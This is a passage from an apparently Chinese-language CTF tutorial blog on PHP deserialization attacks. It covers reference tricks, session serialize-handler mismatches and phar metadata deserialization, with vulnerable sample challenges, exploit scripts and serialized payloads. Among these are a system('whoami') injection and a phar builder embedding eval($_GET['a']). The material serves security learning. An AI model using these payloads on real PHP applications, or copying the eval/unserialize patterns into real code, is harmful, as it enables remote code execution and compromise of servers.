class="hljs-number">3</span>A%<span class="hljs-number">22</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>flag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">//echo serialize(new secret());</span><br><span class="hljs-comment">//O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h3 id="序列号过程中的引用"><a href="#序列号过程中的引用" class="headerlink" title="序列号过程中的引用"></a>序列号过程中的引用</h3><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">just4fun</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$enter</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br>    <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-variable">$pass</span>);<br>&#125;<br><br><span class="hljs-variable">$o</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$pass</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$o</span>) &#123;<br>    <span class="hljs-variable">$o</span>-&gt;secret = <span class="hljs-string">&quot;*&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$o</span>-&gt;secret === <span class="hljs-variable">$o</span>-&gt;enter)<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulation! Here is my secret: &quot;</span>.<span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no... You can&#x27;t fool me&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;are you trolling?&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>障碍：<code>$pass</code>获取值<code>pass</code>后，<code>str_place</code>把*替换掉</p><p>思路：通过构造<code>$pass</code>的值<code>pass</code>使<code>$enter=*</code></p><p><code>$o</code>为反序列化<code>$pass</code>后的对象，且赋值<code>secret=&quot;*&quot;</code></p><p>最终目的：<code>secret===enter</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">just4fun</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$enter</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">just4fun</span>();<br><span class="hljs-variable">$a</span> -&gt; enter = &amp;<span class="hljs-variable">$a</span> -&gt; secret;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>Payload:<br><span class="hljs-comment">//O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br><br><br></code></pre></td></tr></table></figure><h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3><p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化后，存储到指定目录（默认为&#x2F;tmp）</p><p><strong>session默认情况下用php格式存储：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br>    <br>?ben=dazhuang<br>    <br>benben|s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span><br>php：键名+竖线+经过<span class="hljs-title function_ invoke__">serialize</span>()函数序列化处理的值<br></code></pre></td></tr></table></figure><p><strong>session存储格式为php_serialize：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br>    <br>?ben=dazhuang&amp;b=<span class="hljs-number">666</span><br>    <br>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;benben&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>;&#125;<br>php_serialize：经过<span class="hljs-title function_ invoke__">serialize</span>()函数序列化处理的数组<br></code></pre></td></tr></table></figure><p><strong>session存储格式为php_binary：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br>    <br>?ben=dazhuang&amp;b=<span class="hljs-number">666</span><br>    <br>ACKbenbens:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;SOHbs:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>;<br>php_binary：键名的长度对应的ASCII字符+键名+经过<span class="hljs-title function_ invoke__">serialize</span>()函数序列化处理的值<br></code></pre></td></tr></table></figure><p><strong>例题一：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//save.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//vul.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当网站序列号并存储session，与反序列化并读取session的方式不同，就可能导致session反序列化漏洞的产生</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>());<br></code></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:17:&quot;</span>system(&#x27;whoami&#x27;);<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>例题二：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//hint.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>rand</code>随机生成1到10000中的一个数字并md5加密后赋值给<code>her</code></p><p>目标使得<code>name===her</code></p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span> -&gt; name = &amp;<span class="hljs-variable">$a</span> -&gt; her;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">|</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;Flag&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;name&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">N</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;her&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">R</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><p>phar（PHP ARchive）是PHP里类似于JAR的一种打包文件</p><p>对于PHP5.3或更高版本，phar后缀文件是默认开启支持的，可以直接使用它</p><p>文件包含：phar伪协议，可读取.phar文件</p><h4 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h4><p><strong>stub phar</strong> 文件标识，格式为<code>xxx&lt;?php&lt; xxx;__HALT_COMPiLER();?&gt;;</code> (头部信息)</p><p><strong>manifest</strong> 压缩文件的属性等信息，以序列化存储</p><p><strong>contents</strong> 压缩文件的内容</p><p><strong>signature</strong> 签名，放在文件末尾</p><p><strong>phar协议解析文件时，会自动触发对<code>manifast</code>字段的序列化字符串进行反序列化</strong></p><h4 id="phar漏洞原理"><a href="#phar漏洞原理" class="headerlink" title="phar漏洞原理"></a>phar漏洞原理</h4><p><code>manifast</code>压缩文件的属性等信息，以序列化存储，存在一段序列化的字符串</p><p>调用<code>phar</code>伪协议，可读取<code>.phar</code>文件</p><p><code>phar</code>协议解析文件时，会自动触发对<code>manifast</code>字段的序列化字符串进行反序列化</p><p><code>phar</code>需要 <code>PHP&gt;=5.2</code> 在php.ini中将<code>phar.readonly</code>设为<code>off</code></p><p><strong>例题一：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&quot;echo &#x27;ok&#x27;;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;output);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp模板：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Testobj</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);   <span class="hljs-comment">//删除之前的test.par文件(如果有)</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);  <span class="hljs-comment">//创建一个phar对象，文件名必须以phar为后缀</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();  <span class="hljs-comment">//开始写文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="hljs-comment">//写入stub</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<span class="hljs-comment">//写入meta-data</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.phar&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);  <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="phar使用条件"><a href="#phar使用条件" class="headerlink" title="phar使用条件"></a>phar使用条件</h4><ul><li>phar文件能上传到服务器端</li><li>要有可用的反序列化魔术方法作为跳板</li><li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()</li><li>文件操作函数参数可控，且：&#x2F; phar等特殊字符没有过滤</li></ul><p><strong>例题二：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>目标：</strong>echo $flag</p><p>反序列化TestObject()触发__destruck执行echo $flag</p><p>$_POST提交file赋值$filename</p><p>if语句isset判断$filename内容生成md5哈希值</p><p><strong>解题步骤：</strong></p><p>生成一个phar文件，在mate-data里放置一个包含TestObject()的序列化字符串</p><p>上传文件</p><p>md5_file执行phar伪协议，触发反序列化</p><p>反序列化TestObject()触发__destruck执行echo $flag</p><p>phar文件生成脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);   <span class="hljs-comment">//删除之前的test.par文件(如果有)</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);  <span class="hljs-comment">//创建一个phar对象，文件名必须以phar为后缀</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();  <span class="hljs-comment">//开始写文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="hljs-comment">//写入stub</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<span class="hljs-comment">//写入meta-data</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.phar&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);  <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span 